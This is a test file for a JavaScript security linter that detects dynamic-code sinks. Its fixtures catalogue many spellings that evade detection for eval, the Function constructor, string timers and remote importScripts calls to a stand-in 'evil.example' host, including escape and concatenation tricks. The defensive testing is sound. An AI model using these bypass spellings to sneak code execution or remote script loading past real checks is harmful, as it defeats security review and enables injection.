// SPDX-License-Identifier: AGPL-3.0-or-later
//
// The shared dynamic-code-sink definitions are consumed by FOUR gates
// (lint:security, check:sw, check:update-channel,
// check:private-bundle-transparency), so a hole here is a hole in all four.
//
// These tests assert BEHAVIOUR through `findDynamicCodeSinks` — the entry
// point the gates actually call — rather than poking at internal patterns.
// That matters historically: detection used to be a family of regexes, and
// review of PR #169 found a new bypass SPELLING on six consecutive rounds.
// Every one of those spellings is kept below as a permanent case, and they now
// pass against a tokeniser that walks the access chain instead of enumerating
// forms. A test naming a pattern would have had to be rewritten with the
// implementation; a test naming a BEHAVIOUR carries straight across, which is
// exactly what made the rewrite safe to do.
import { describe, expect, it } from 'vitest';
import {
  BUILT_CODE_SINKS,
  DYNAMIC_CODE_SINKS,
  findDynamicCodeSinks,
  REMOTE_IMPORT_SCRIPTS_SINK,
  SOURCE_CODE_SINKS,
  scanSourceForSinks,
  stripComments,
  tokenize,
} from './dangerous-code-patterns.js';

/** Does the shared sink set fire on this source? */
const fires = (code: string): boolean => findDynamicCodeSinks(code).length > 0;

/**
 * Build the template source `` `${expr}` `` as FIXTURE TEXT.
 *
 * Written through a helper so the `${` never appears inside a plain string
 * literal, where it reads as an interpolation this file does not intend.
 */
const tpl = (expr: string): string => `\`$${'{'}${expr}}\``;

describe('the Function constructor', () => {
  it.each([
    ['new Function("…")', 'const f = new Function("return 1");'],
    // The regression this module exists for: all four gates once pinned only
    // `new Function(`, so the equivalent bare call passed every one.
    ['bare Function()', 'const f = Function("return 1");'],
    ['globalThis.Function()', 'const f = globalThis.Function("x")();'],
    ['window.Function()', 'const f = window.Function("x")();'],
    ['self.Function()', 'const f = self.Function("x")();'],
    ['spaced call', 'const f = Function ("x");'],
    // Round 2: parenthesized and computed references.
    ['parenthesized', "const f = (Function)('return 1');"],
    ['new + parenthesized', "const f = new (Function)('return 1');"],
    ['computed on globalThis', "const f = globalThis['Function']('return 1');"],
    ['computed on window', 'const f = window["Function"]("x");'],
    ['computed on self', "const f = self['Function']('x');"],
    // Round 3: optional call and the comma/sequence idiom.
    ['optional call', "const f = Function?.('x');"],
    ['sequence idiom', "const f = (0, Function)('x');"],
    // Round 4: the template-tag form.
    ['template tag', 'const f = Function`return 1`();'],
    // Round 5: inherited function methods.
    ['call', "const f = Function.call(null, 'return 42')();"],
    ['apply', "const f = Function.apply(null, ['return 42'])();"],
    ['bind', "const f = Function.bind(null)('return 42')();"],
    ['global receiver + apply', "globalThis.Function.apply(null, ['x'])();"],
    ['Reflect.apply', "Reflect.apply(Function, null, ['return 42'])();"],
    ['Reflect.construct', "Reflect.construct(Function, ['return 42'])();"],
    // Round 6: qualified references in reflective position.
    ['Reflect.apply + global receiver', "Reflect.apply(globalThis.Function, null, ['x'])();"],
    ['Reflect.construct + computed', "Reflect.construct(window['Function'], ['x'])();"],
    // Round 7: computed and optional access to the inherited method.
    ['computed method', "Function['call'](null, 'return 42')();"],
    ['computed method, double quotes', 'Function["apply"](null, ["return 42"])();'],
    ['optional method on a global', "globalThis.Function?.call(null, 'return 42')();"],
    ['optional method, bare', "Function?.bind(null)('return 42')();"],
    // Round 14: a property that RESOLVES BACK to the constructor. Every
    // function's `.constructor` IS `Function`, so these build the same object.
    ['constructor', "Function.constructor('return 42')()"],
    ['prototype.constructor', "Function.prototype.constructor('return 42')()"],
    ['constructor via eval', "eval.constructor('return 42')()"],
    ['constructor via a timer', "setTimeout.constructor('return 42')()"],
    ['computed constructor', "Function['constructor']('return 42')()"],
    // Round 15: `.constructor` reached from an ORDINARY function. Round 14
    // only continued the chain once a KNOWN sink had already been resolved,
    // so any function that is not itself a sink still handed out `Function`
    // for free. Which receivers are functions is undecidable statically, so
    // an invoked `.constructor` is now the sink whatever it hangs off.
    ['constructor on an arrow function', "(()=>{}).constructor('return 42')()"],
    ['constructor on a function expression', "(function(){}).constructor('return 42')()"],
    [
      'constructor on a function expression, unparenthesised',
      "x = function(){}.constructor('return 42')()",
    ],
    ['constructor on an async arrow', "(async()=>{}).constructor('return 42')()"],
    ['constructor on a declared function', 'function f(){}; f.constructor("return 42")()'],
    ['constructor on a built-in method', "[].map.constructor('return 42')()"],
    ['constructor on Object.prototype.toString', "({}).toString.constructor('return 42')()"],
    ['computed constructor on a function literal', "(()=>{})['constructor']('return 42')()"],
    ['optional constructor on a function literal', "(()=>{})?.constructor?.('return 42')()"],
    // Round 8: computed access on `Reflect` itself.
    ['computed Reflect accessor', "Reflect['apply'](Function, null, ['return 42'])();"],
    ['computed Reflect.construct', 'Reflect["construct"](Function, ["x"])();'],
    ['optional Reflect accessor', "Reflect?.apply(Function, null, ['x'])();"],
  ])('catches %s', (_label, code) => {
    expect(fires(code)).toBe(true);
  });

  it.each([
    ['a suffixed identifier', 'const v = getFunction(name);'],
    ['an AsyncFunction-suffixed identifier', 'const v = isAsyncFunction(fn);'],
    ['a member access with no call', 'const t = registry.Function;'],
    ['a type annotation', 'function apply(fn: Function): void {}'],
    ['a lowercase function declaration', 'function build(x) { return x; }'],
    ['an ordinary .call on some other callee', "handler.call(null, 'x');"],
    ['an ordinary .apply on some other callee', 'fn.apply(this, args);'],
    ['a reflective call on an unrelated callee', 'Reflect.apply(handler, null, [arg]);'],
    ['the same with a computed accessor', "Reflect['apply'](handler, null, [arg]);"],
    ['an unrelated Reflect method', 'Reflect.ownKeys(obj);'],
    // The boundary for `.constructor` is CALL vs READ, not what it hangs off:
    // `obj.constructor('x')` used to be asserted clean here, and round 15
    // showed that is precisely the hole (`obj` may be any function). Reading
    // the property is not evaluation, so these stay clean.
    ['a .constructor comparison', 'if (x.constructor === Foo) {}'],
    ['a .constructor.name read', 'const n = x.constructor.name;'],
    ['a destructured constructor', 'const { constructor } = x;'],
    ['a class constructor definition', 'class A { constructor(a) { this.a = a; } }'],
    ['a derived class constructor', 'class B extends A { constructor() { super(); } }'],
    ['a constructor property in an object literal', 'const o = { constructor: 1 };'],
    ['a constructor key in a type position', "type T = A['constructor'];"],
    ['an array literal holding the name', "const arr = ['constructor'];"],
    ['a .prototype read with no call', 'const p = Function.prototype;'],
  ])('does not flag %s', (_label, code) => {
    expect(fires(code)).toBe(false);
  });
});

describe('eval', () => {
  it.each([
    'const x = eval("1");',
    "(eval)('x')",
    "globalThis['eval']('x')",
    'window["eval"]("x")',
    "globalThis.eval('x')",
    "window.eval('x')",
    "self.eval('x')",
    "eval?.('x')",
    "(0, eval)('x')",
    // Round 5: inherited methods — indirect eval runs in GLOBAL scope.
    "eval.call(null, '40+2')",
    "eval.apply(null, ['40+2'])",
    "eval.bind(null)('40+2')",
    "globalThis.eval.call(null, 'x')",
    "Reflect.apply(eval, null, ['x'])",
    // Round 6-8: qualified reflective references, computed access.
    "Reflect.apply(globalThis.eval, null, ['payload'])",
    "Reflect.apply(self['eval'], null, ['payload'])",
    "eval['call'](null, '40+2')",
    "self?.['eval']?.call(null, 'x')",
    "Reflect['apply'](eval, null, ['payload'])",
  ])('catches %s', (code) => {
    expect(fires(code)).toBe(true);
  });

  // A library method named `eval` is somebody's property, not the global sink.
  // The token walk gets this right structurally — the old regex needed a
  // hand-written lookbehind, and that lookbehind is why the computed spellings
  // below had to be special-cased one at a time.
  it.each([
    'await redis.eval(script, 0);',
    'await client.eval(lua, keys);',
    'await redis.eval.call(client, script, 0);',
    'await client.eval.apply(client, [lua, keys]);',
    "await redis['eval'].call(client, script, 0);",
    "await redis.eval['apply'](client, [lua, keys]);",
    'const r = retrieval(query);',
    'this.#eval(node);',
  ])('does not flag %s', (code) => {
    expect(fires(code)).toBe(false);
  });
});

describe('string timers (implicit eval)', () => {
  it.each([
    'setTimeout("evil()", 0)',
    "setInterval('evil()', 10)",
    'setTimeout(`evil()`, 0)',
    'setTimeout( "evil()" , 0)',
    'globalThis.setTimeout("evil()", 0)',
    // Round 5: the same indirections as eval/Function.
    "setTimeout?.('evil()', 0)",
    "globalThis.setTimeout?.('evil()', 0)",
    "globalThis['setTimeout']('evil()', 0)",
    'self["setInterval"]("evil()", 10)',
    "(setInterval)('evil()', 10)",
    "(0, setTimeout)('evil()', 0)",
    'setTimeout/* c */("evil()", 0)',
    "setTimeout.call(window, 'evil()', 0)",
    'setInterval.apply(window, ["evil()", 10])',
    // Round 6: bound and reflective invocation.
    "setTimeout.bind(globalThis, 'evil()')()",
    "Reflect.apply(setTimeout, globalThis, ['evil()'])",
    "Reflect.apply(globalThis.setTimeout, self, ['evil()'])",
    // Round 9: computed method access.
    "setTimeout['call'](globalThis, 'payload')",
    "globalThis.setTimeout?.call(globalThis, 'payload')",
    'setInterval["apply"](globalThis, ["payload", 10])',
    "Reflect['apply'](setTimeout, globalThis, ['evil()'])",
  ])('catches the implicit eval in %s', (code) => {
    expect(fires(code)).toBe(true);
  });

  // A FUNCTION argument is the legitimate use and must stay clean through
  // every one of the same spellings — a widened check that flagged ordinary
  // scheduling code would simply get suppressed at the call sites.
  it.each([
    'setTimeout(() => run(), 0)',
    'setInterval(tick, 1000)',
    'setTimeout(handler, delayMs)',
    "globalThis['setTimeout'](tick, 0)",
    'setTimeout?.(() => run(), 0)',
    '(0, setTimeout)(handler, 0)',
    'setTimeout.call(window, tick, 0);',
    'setTimeout.apply(window, [tick, 0]);',
    'setTimeout.bind(globalThis, tick)();',
    'Reflect.apply(setTimeout, globalThis, [tick, 0]);',
    'setTimeout(() => self.skipWaiting(), 0);',
  ])('does not flag the function form %s', (code) => {
    expect(fires(code)).toBe(false);
  });
});

describe('remote importScripts', () => {
  const remote = (code: string): boolean =>
    findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK]).length > 0;

  it.each([
    'importScripts("https://x/y.js");',
    'importScripts("//evil/x.js");',
    // Round 9: the same indirections as every other sink.
    "self['importScripts']('https://evil.example/x.js')",
    "self.importScripts?.('https://evil.example/x.js')",
    "importScripts.call(self, 'https://evil.example/x.js')",
  ])('catches %s', (code) => {
    expect(remote(code)).toBe(true);
  });

  it.each([
    'importScripts("sw-push.js");',
    'importScripts(l);',
    '// code imported by the generated worker via importScripts — same-origin only',
  ])('does not flag %s', (code) => {
    expect(remote(code)).toBe(false);
  });
});

describe('comments and prose', () => {
  // The tokeniser DISCARDS comments, so doctrine can be discussed without
  // suppressing the gate. This used to require a `commentSensitive` flag and a
  // separate stripped pass, and getting that wrong produced a false positive
  // on the shipped service worker (whose header reads "no eval (WS-C.2.1d)").
  it.each([
    '// no remote code, no eval (WS-C.2.1d)',
    '// rejects `new Function`, and eval',
    '/* importScripts("https://x") is forbidden */',
    '/* setTimeout("evil()", 0) must never appear */',
    'const s = "eval(\'x\')";',
    'const t = \'new Function("x")\';',
  ])('does not flag %s', (code) => {
    expect(fires(code)).toBe(false);
  });

  it('still flags a real call sharing a line with prose about it', () => {
    expect(fires('eval("x"); // this eval is real')).toBe(true);
  });
});

describe('lexing hazards', () => {
  // Each of these defeated the comment-stripping approach at some point in
  // review. The tokeniser handles strings, templates and regex literals as
  // part of lexing, and the ambiguous `/` is resolved by scanning BOTH
  // readings — so a wrong guess can no longer delete the call.
  it.each([
    ['a `/*` inside a string literal', `const start = "/*"; eval("payload"); const end = "*/";`],
    [
      'a regex containing `/*`, with a string `*/` later',
      `if (ok) /[/*]/.test(x); Function('return 42')(); const tail = '*/';`,
    ],
    [
      'the same hiding a NON-literal eval argument',
      `if (ok) /[/*]/.test(x); eval(payload); const tail = '*/';`,
    ],
    ['a call split across a newline', "const f = Function\n('return 1');"],
    ['an interposed block comment', "const f = Function/* gap */('return 1');"],
    [
      'an object literal inside a template interpolation',
      // Written as a template with escaped `\${` so the interpolation is
      // FIXTURE TEXT handed to the tokeniser, not something this file
      // interpolates.
      `const s = \`\${ {a:1} }\`; eval("payload");`,
    ],
  ])('catches a sink despite %s', (_label, code) => {
    expect(fires(code)).toBe(true);
  });

  it('catches a remote importScripts the same lexing hazard would hide', () => {
    // Same hazard, but importScripts is not in the default sink set, so it is
    // scanned with its own spec — the way `check:sw` calls it.
    const code = `if (ok) /[/*]/.test(x); importScripts('https://evil.example/x.js'); const t = '*/';`;
    expect(findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK])).toHaveLength(1);
  });

  it('does not mistake ordinary division for a regex', () => {
    expect(fires('const r = a / b; const s = c / d;')).toBe(false);
    expect(fires('const r = a++ / b;')).toBe(false);
  });

  it('reports the line the sink starts on', () => {
    const code = ['const a = 1;', 'const b = 2;', "eval('x');"].join('\n');
    expect(findDynamicCodeSinks(code)).toEqual([{ label: 'eval()', line: 3 }]);
  });
});

describe('lexical grammar coverage', () => {
  // Round 11 findings. Unlike the spelling enumeration this module replaced,
  // these are a CLOSED set: the tokeniser has to cover JavaScript's lexical
  // grammar, and that grammar is finite and specified.
  it.each([
    ['a \\u escape in a bare identifier', "\\u0065val('payload')"],
    ['a \\u escape in a member name', "globalThis.F\\u0075nction('return 42')()"],
    ['a \\u{…} escape', "\\u{65}val('payload')"],
    ['an escape in a computed member name', "globalThis['\\u0065val']('payload')"],
  ])('decodes %s', (_label, code) => {
    expect(fires(code)).toBe(true);
  });

  it.each([
    ['eval', `const x = ${tpl('eval(payload)')};`],
    ['the Function constructor', `const x = ${tpl('Function("return 1")()')};`],
    ['a string timer', `const x = ${tpl('setTimeout("evil()", 0)')};`],
    ['a sink in a NESTED interpolation', `const x = ${tpl(tpl('eval(payload)'))};`],
  ])('finds %s inside a template interpolation', (_label, code) => {
    // An interpolation is executable code, not text — emitting the literal as
    // one opaque token hid every sink written inside one.
    expect(fires(code)).toBe(true);
  });

  it('finds a sink past a REGEX LITERAL inside an interpolation', () => {
    // The `}` inside `/}/ ` is regex content, not the end of the span. A
    // hand-rolled brace counter read it as the terminator and stopped early;
    // the span end is now found by tokenising, which already handles regex.
    expect(fires(`const x = ${tpl('/}/.test(y); eval(payload)')};`)).toBe(true);
    expect(fires(`const x = ${tpl('/}/.test(y); Function("return 1")()')};`)).toBe(true);
  });

  it('treats an INTERPOLATED template as a string argument', () => {
    // Still a string the host compiles, so the timer form fires…
    expect(fires(`setTimeout(\`evil($${'{'}value})\`, 0)`)).toBe(true);
    // …and a remote URL is remote even when only its path varies.
    expect(
      findDynamicCodeSinks(`importScripts(\`https://evil.example/$${'{'}name}.js\`)`, [
        REMOTE_IMPORT_SCRIPTS_SINK,
      ]),
    ).toHaveLength(1);
  });

  it('does not treat a same-origin interpolated template as remote', () => {
    expect(
      findDynamicCodeSinks(`importScripts(\`./chunks/$${'{'}name}.js\`)`, [
        REMOTE_IMPORT_SCRIPTS_SINK,
      ]),
    ).toEqual([]);
  });

  it('removes a LINE CONTINUATION when decoding a string', () => {
    // `\\<newline>` contributes nothing, so this literal IS
    // `https://evil.example/x.js` at runtime and the scheme must be seen.
    const code = "importScripts('https:\\\n//evil.example/x.js')";
    expect(findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK])).toHaveLength(1);
  });

  it('decodes escapes inside a computed member string', () => {
    expect(fires("self['\\x65val']('payload')")).toBe(true);
  });
});

describe('aliased sinks', () => {
  // Round 12. A name BOUND to a sink invokes the same global — the last
  // realistic route left once every spelling of the reference itself is
  // covered structurally.
  it.each([
    ['the Function constructor', "const F = Function; F('return 42')()"],
    ['eval', 'const e = eval; e(payload)'],
    ['a string timer', "const t = setTimeout; t('evil()', 0)"],
    ['an alias of an alias', "const F = Function; const G = F; G('x')()"],
    ['an alias reached reflectively', "const F = Function; Reflect.apply(F, null, ['x'])()"],
    ['an alias of a qualified reference', "const e = globalThis.eval; e('payload')"],
  ])('catches %s', (_label, code) => {
    expect(fires(code)).toBe(true);
  });

  it('does not flag an aliased timer given a FUNCTION argument', () => {
    // The alias resolves, but the argument rule still applies — otherwise
    // ordinary `const t = setTimeout; t(tick, 0)` code would be flagged.
    expect(fires('const t = setTimeout; t(tick, 0)')).toBe(false);
  });

  // Round 13: a TypeScript annotation sits between the name and the `=`, and
  // this repository is TypeScript-first, so a typed alias is the NORMAL way to
  // write one.
  it.each([
    ['FunctionConstructor', "const F: FunctionConstructor = Function; F('return 42')()"],
    ['typeof eval', 'const e: typeof eval = eval; e(payload)'],
    ['typeof setTimeout', "const t: typeof setTimeout = setTimeout; t('evil()', 0)"],
  ])('follows a typed alias declaration: %s', (_label, code) => {
    expect(fires(code)).toBe(true);
  });

  it('does not flag an unrelated binding', () => {
    expect(fires("const f = handler; f('x')")).toBe(false);
    expect(fires("const f = obj.method; f('x')")).toBe(false);
  });

  it('does not treat an annotation with no initializer as a binding', () => {
    expect(fires("let F: FunctionConstructor; F('x')()")).toBe(false);
  });

  it('does not treat a comparison as a binding', () => {
    // `==`/`===`/`=>` lex differently from the single `=` assignment, so none
    // of them can create an alias.
    expect(fires("if (f === Function) { f('x') }")).toBe(false);
  });

  // Round 16: two more BINDING FORMS. Both are the same act as `const F =
  // Function` — giving a sink a second name — so they resolve through the same
  // alias table rather than through a second mechanism. An object literal
  // holding sinks makes the object a RECEIVER, which is exactly the
  // relationship `globalThis`/`window`/`self` already had.
  it.each([
    ['destructured eval', 'const { eval: run } = globalThis; run(payload)'],
    ['destructured Function', "const { Function: F } = window; F('return 1')()"],
    ['destructured timer', "const { setTimeout: t } = self; t('evil()', 0)"],
    ['an alias of a destructured sink', "const { eval: r } = globalThis; const q = r; q('x')"],
    ['a sink held in an object property', "const o = { run: eval }; o.run('x')"],
    ['the constructor held in an object property', "const o = { F: Function }; o.F('x')()"],
    ['a computed property key', "const o = { ['ev' + 'al']: eval }; o['eval']('x')"],
  ])('catches %s', (_label, code) => {
    expect(fires(code)).toBe(true);
  });

  it.each([
    ['an unrelated destructured name', 'const { fetch: f } = globalThis; f(url)'],
    ['an unrelated object property', "const o = { run: handler }; o.run('x')"],
    ['a different property of a sink-holding object', "const o = { run: eval }; o.other('x')"],
    // A spread, a method and a nested pattern are skipped whole rather than
    // mis-paired with the entries after them.
    ['a spread before the entries', "const o = { ...base, run: handler }; o.run('x')"],
    ['a method before the entries', "const o = { m() { return 1; }, run: handler }; o.run('x')"],
    ['a nested destructuring pattern', 'const { a: { b } } = cfg; b(x)'],
  ])('does not flag %s', (_label, code) => {
    expect(fires(code)).toBe(false);
  });
});

describe('constant string folding', () => {
  // Round 16. Every string predicate used to read only the FIRST token of an
  // argument, which made `+` a universal bypass: the pieces of a URL or a
  // property name written apart evaluate to exactly the same value as written
  // together, so it is a SPELLING. Folding happens once and every predicate —
  // remote-URL, string-timer, computed member access — shares it.
  const remote = (code: string): boolean =>
    findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK]).length > 0;

  it.each([
    "importScripts('ht' + 'tps://evil.example/x.js')",
    'importScripts(`ht` + `tps://evil.example/x.js`)',
    "importScripts(('ht' + 'tps:') + '//evil.example/x.js')",
    "importScripts('//' + 'evil.example/x.js')",
    "importScripts('https://evil.example/' + name + '.js')",
  ])('catches a composed remote URL: %s', (code) => {
    expect(remote(code)).toBe(true);
  });

  it.each([
    "importScripts('sw' + '-push.js')",
    "importScripts('/assets/' + name + '.js')",
    "importScripts(origin + '/x.js')",
  ])('does not flag a composed same-origin URL: %s', (code) => {
    expect(remote(code)).toBe(false);
  });

  it.each([
    ['a composed sink name', "globalThis['ev' + 'al']('x')"],
    ['a composed method name', "Function['ca' + 'll'](null, 'return 42')()"],
    ['a composed constructor name', "(()=>{})['const' + 'ructor']('return 42')()"],
    // `+` yields a string whenever EITHER operand is one, so the timer body is
    // a string even though it does not begin with a literal.
    ['a composed timer body', "setTimeout(prefix + 'evil()', 0)"],
    ['a trailing composed timer body', "setInterval('evil(' + arg + ')', 10)"],
  ])('catches %s', (_label, code) => {
    expect(fires(code)).toBe(true);
  });

  it.each([
    ['a numeric addition as a timer delay', 'setTimeout(handler, delay + 1)'],
    ['a numeric first argument', 'setTimeout(delay + 1, 0)'],
    ['an indexed handler lookup', "setTimeout(handlers['x'], 0)"],
    ['an arrow body containing a string', "setTimeout(() => f('str'), 0)"],
  ])('does not flag %s', (_label, code) => {
    expect(fires(code)).toBe(false);
  });
});

describe('the assembled sink sets', () => {
  it('SOURCE and BUILT agree on every sink form', () => {
    const forms = [
      'const a = eval("1");',
      'const b = new Function("x");',
      'const c = Function("x");',
      'const d = globalThis.Function("x");',
      'setTimeout("x()", 0);',
    ];
    for (const code of forms) {
      expect(findDynamicCodeSinks(code, SOURCE_CODE_SINKS).length).toBeGreaterThan(0);
      expect(findDynamicCodeSinks(code, BUILT_CODE_SINKS).length).toBeGreaterThan(0);
    }
  });

  it('neither set flags ordinary code', () => {
    const clean = [
      'export function render(node) { return node.value; }',
      'setTimeout(() => flush(), 0);',
      'const parsed = JSON.parse(raw);',
      'await redis.eval(script, 0);',
    ].join('\n');
    expect(findDynamicCodeSinks(clean, SOURCE_CODE_SINKS)).toEqual([]);
    expect(findDynamicCodeSinks(clean, BUILT_CODE_SINKS)).toEqual([]);
  });

  it('every sink carries a human label the gates can phrase', () => {
    for (const { label } of [...DYNAMIC_CODE_SINKS, REMOTE_IMPORT_SCRIPTS_SINK]) {
      expect(label.length).toBeGreaterThan(0);
    }
  });

  it('reports one finding per sink occurrence, not one per matching rule', () => {
    expect(findDynamicCodeSinks('eval("x");')).toHaveLength(1);
  });
});

describe('tokenize', () => {
  it('skips comments, strings, templates and regex literals', () => {
    const kinds = tokenize('// c\n/* c */ "s" `t` ; /re/ ; x').map((t) => t.kind);
    expect(kinds).toEqual(['string', 'template', 'punct', 'regex', 'punct', 'ident']);
  });

  it('keeps a template with an interpolation as ONE token', () => {
    expect(tokenize(`\`a\${ {b:1} }c\``)).toHaveLength(1);
  });

  it('does not run an unterminated string past its line', () => {
    // An unterminated literal must not swallow the rest of the file and hide
    // whatever follows it.
    expect(fires("const bad = 'oops\neval('x');")).toBe(true);
  });
});

describe('stripComments', () => {
  // No longer load-bearing for sink detection, but still used for the
  // update-channel MARKER checks, so its offset-preserving contract stands.
  it('preserves length and newlines so offsets still map to lines', () => {
    const source = 'const a = 1; // note\n/* block */ const b = 2;\n';
    const stripped = stripComments(source);
    expect(stripped).toHaveLength(source.length);
    expect(stripped.split('\n')).toHaveLength(source.split('\n').length);
  });

  it('blanks comments but keeps code and string contents', () => {
    const stripped = stripComments('const a = "keep /* me */"; // drop\n');
    expect(stripped).toContain('keep /* me */');
    expect(stripped).not.toContain('drop');
  });
});

describe('scanSourceForSinks (textual DOM patterns)', () => {
  const DOM = [{ pattern: /\.innerHTML\s*=/, label: 'innerHTML' }];

  it('matches over the whole text and reports the line', () => {
    const code = ['const a = 1;', 'el.innerHTML = html;'].join('\n');
    expect(scanSourceForSinks(code, DOM)).toEqual([{ label: 'innerHTML', line: 2 }]);
  });

  it('does not match inside a comment', () => {
    expect(scanSourceForSinks('// el.innerHTML = x\n', DOM)).toEqual([]);
  });
});

describe('linearity (performance canary)', () => {
  // A wall-clock bound alone is a weak and flaky way to assert an algorithmic
  // property, and this one caught a REAL O(n²) — span finding re-lexed the
  // whole remaining template for every interpolation — only intermittently.
  // This asserts the SCALING instead, which is the property that matters and
  // does not depend on machine load.
  it('scales linearly in the number of template interpolations', () => {
    const build = (k: number): string => `\`${`${'$'}{a}`.repeat(k)}\``;
    const time = (code: string): number => {
      const started = performance.now();
      findDynamicCodeSinks(code);
      return performance.now() - started;
    };
    // Warm the JIT so the first measurement is not the slow one.
    time(build(500));
    const small = Math.max(time(build(1000)), 1);
    const large = time(build(8000));
    // 8x the input. Linear predicts ~8x; quadratic predicts ~64x. A generous
    // 24x ceiling separates the two without being sensitive to load.
    expect(large / small).toBeLessThan(24);
  });

  // The regex family this replaced once shipped a nested quantifier that took
  // `lint:security` from ~2s to unbounded (killed at 9+ minutes at 100% CPU).
  // The analyzer is a linear scan, but these keep any future regression in the
  // remaining textual patterns from reaching CI as a hang.
  it.each([
    ['deep indentation before a non-match', `${' '.repeat(5000)}notASink(x);`],
    ['a long comment run', `${'// filler\n'.repeat(2000)}const a = 1;`],
    ['a long template with interpolations', `\`${`${'$'}{a}`.repeat(500)}\``],
    ['a long unterminated block comment', `/*${'x'.repeat(20000)}`],
  ])('completes in bounded time: %s', (_label, code) => {
    const started = Date.now();
    findDynamicCodeSinks(code);
    expect(Date.now() - started).toBeLessThan(2000);
  });
});
